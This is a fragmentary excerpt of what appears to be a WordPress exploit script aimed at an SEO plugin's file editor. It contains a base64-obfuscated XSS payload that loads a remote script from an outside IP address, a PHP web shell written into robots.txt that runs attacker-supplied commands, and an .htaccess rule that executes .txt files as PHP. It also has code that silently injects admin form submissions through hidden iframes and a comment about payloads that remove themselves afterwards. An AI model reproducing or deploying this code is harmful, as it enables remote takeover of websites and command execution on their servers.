...
// Injection Payload: "><script>document.write(atob(/PHNjcmlwdCBzcmM9Imh0dHA6Ly8xOTIuMTY4LjkyLjE0OC94c3MuanMiPjwvc2NyaXB0Pg==/.source))</script>
...
var robots_shell = '<?php $input = base64_decode($_GET["sostest"]); $output = `$input`; echo "<pre>". $output ."</pre>"; ?>'; // Almost anything works here
var htacces_shell = "AddHandler application/x-httpd-php .txt"; // Executes .txt files as PHP - On some servers it needs to be: application/x-httpd-php5
...
function silent_robots_inject() {
   ...
   <input type="hidden" name="_wp_http_referer" value="%2Fhitbwp%2Fwp-admin%2Fadmin.php%3Fpage%3Dwpseo_files" />\
...
'+htacces_shell+'\' />\
   ...
   // Initiate the second silent injection into our iframe
   silent_form_inject('admin.php?page=wpseo_files','POST',htaccess_input,'silent_htaccess_frame','htaccess_haxx');
   ...
   // Give the malicious 404 entries 5 seconds to inject a small payload, before self-removal
